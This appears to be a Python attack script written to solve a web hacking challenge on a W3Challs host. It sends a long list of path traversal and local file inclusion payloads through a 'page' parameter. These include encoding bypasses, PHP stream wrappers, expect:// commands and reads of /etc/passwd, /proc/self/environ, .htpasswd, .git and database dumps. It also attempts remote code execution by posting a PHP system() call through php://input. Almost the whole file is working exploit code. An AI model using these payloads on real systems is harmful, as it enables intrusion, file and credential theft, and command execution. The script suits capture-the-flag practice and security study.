#!/usr/bin/env python3
import requests
import base64
import urllib.parse

s = requests.Session()
base = "https://vip.hax.w3challs.com/"

print("[*] Creative LFI/Path traversal attempts...")

# The hint says there are path restrictions
# Common restrictions and bypasses:
# 1. Filtering ../ -> use encoding or alternative syntax
# 2. Filtering php:// -> use case variations or encoding
# 3. Appending .php -> use null byte
# 4. Checking for specific directories -> use symbolic links or alternative paths

creative_payloads = [
    # Encoding variations
    (".%2e/%2e%2e/%2e%2e/etc/passwd", "mixed encoding"),
    ("..;/..;/etc/passwd", "semicolon bypass"),
    ("..//..//etc//passwd", "double slash"),
    ("....//....//etc/passwd", "double dots"),
    (".?/?.?/etc/passwd", "question mark"),
    (".%00/..%00/etc/passwd", "null in path"),
    
    # PHP filter variations
    ("PHP://filter/convert.base64-encode/resource=index", "uppercase PHP"),
    ("PhP://filter/convert.base64-encode/resource=index", "mixed case"),
    ("php:file://filter/convert.base64-encode/resource=index", "php:file"),
    ("php://Filter/convert.base64-encode/resource=index", "capital Filter"),
    
    # Try to read PHP files without filter
    ("index.php", "direct index.php"),
    ("index.PHP", "uppercase extension"),
    ("index", "no extension"),
    ("./index", "current dir index"),
    ("../vip.hax.w3challs.com/index", "parent dir"),
    
    # Interesting files that might not be filtered
    (".htaccess", "htaccess"),
    (".htpasswd", "htpasswd"),
    ("config.inc", "config.inc"),
    ("config.inc.php", "config.inc.php"),
    ("configuration.php", "configuration"),
    ("settings.php", "settings"),
    ("database.php", "database"),
    ("db.php", "db"),
    ("conn.php", "connection"),
    
    # Try reading from /proc
    ("/proc/self/environ", "proc environ"),
    ("../../../proc/self/environ", "traversal to proc"),
    ("/proc/self/cmdline", "proc cmdline"),
    ("/proc/self/cwd/index.php", "proc cwd"),
    
    # Windows paths (in case)
    ("C:\\windows\\system32\\drivers\\etc\\hosts", "windows hosts"),
    ("C:/windows/system32/drivers/etc/hosts", "windows hosts forward"),
    
    # Try data wrapper
    ("data://text/plain,<?php phpinfo(); ?>", "data wrapper"),
    ("data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==", "data base64"),
    
    # Zip/phar wrappers
    ("zip://test.zip#test.txt", "zip wrapper"),
    ("phar://test.phar/test.txt", "phar wrapper"),
    
    # Try glob wrapper
    ("glob:///*", "glob root"),
    ("glob://*.php", "glob php files"),
    
    # Input wrapper
    ("php://input", "php input"),
    ("php://stdin", "php stdin"),
    ("php://stdout", "php stdout"),
    
    # FTP wrapper
    ("ftp://localhost/etc/passwd", "ftp local"),
    
    # File wrapper explicit
    ("file:///etc/passwd", "file protocol"),
    ("file://localhost/etc/passwd", "file localhost"),
    
    # Expect wrapper
    ("expect://id", "expect id"),
    ("expect://ls", "expect ls"),
]

for payload, description in creative_payloads:
    url = f"{base}index.php?page={payload}"
    r = s.get(url)
    
    # Check for interesting responses
    if 'root:' in r.text:
        print(f"[!!!] /etc/passwd found with {description}: {payload}")
    elif '<?php' in r.text:
        print(f"[!!!] PHP code with {description}: {payload}")
    elif 'Warning' in r.text or 'Fatal' in r.text:
        print(f"[!] Error with {description}: {payload}")
        import re
        errors = re.findall(r'(Warning|Fatal error):.*', r.text)[:1]
        for error in errors:
            print(f"    {error[:150]}")
    elif len(r.text) < 500:
        print(f"[+] Small response with {description}: {payload}")

# Try POST request with php://input
print("\n[*] Testing php://input with POST data...")

post_data = "<?php system('cat /etc/passwd'); ?>"
headers = {'Content-Type': 'application/x-www-form-urlencoded'}
r = s.post(f"{base}index.php?page=php://input", data=post_data, headers=headers)
if 'root:' in r.text:
    print("[!!!] Command execution via php://input!")

# Try to bypass with long paths
print("\n[*] Testing long path bypass...")

long_path = "../" * 50 + "etc/passwd"
r = s.get(f"{base}index.php?page={long_path}")
if 'root:' in r.text:
    print("[!!!] Long path bypass worked!")

# Try URL encoding multiple times
print("\n[*] Testing multiple URL encoding...")

double_encoded = urllib.parse.quote(urllib.parse.quote("../../../etc/passwd"))
triple_encoded = urllib.parse.quote(double_encoded)

for enc, name in [(double_encoded, "double"), (triple_encoded, "triple")]:
    r = s.get(f"{base}index.php?page={enc}")
    if 'root:' in r.text:
        print(f"[!!!] {name} encoding worked: {enc}")

# Try to access files in current directory
print("\n[*] Trying to access local files...")

local_files = [
    "flag", "flag.txt", "flag.php", ".flag",
    "secret", "secret.txt", "secret.php", ".secret",
    "password", "passwords", "pass.txt",
    "config", "config.php", "configuration.php",
    "README", "README.txt", "README.md",
    "TODO", "TODO.txt",
    ".git/config", ".git/HEAD",
    ".svn/entries",
    "backup.sql", "dump.sql", "database.sql",
    "users.txt", "users.sql",
    "members.txt", "members.php", "members.sql"
]

for file in local_files:
    r = s.get(f"{base}index.php?page={file}")
    if len(r.text) < 2000 and 'Welcome to' not in r.text:
        print(f"[+] Different response for: {file} ({len(r.text)} bytes)")
        
    # Try with null byte
    r = s.get(f"{base}index.php?page={file}%00")
    if len(r.text) < 2000 and 'Welcome to' not in r.text:
        print(f"[+] Different with null byte: {file}%00 ({len(r.text)} bytes)")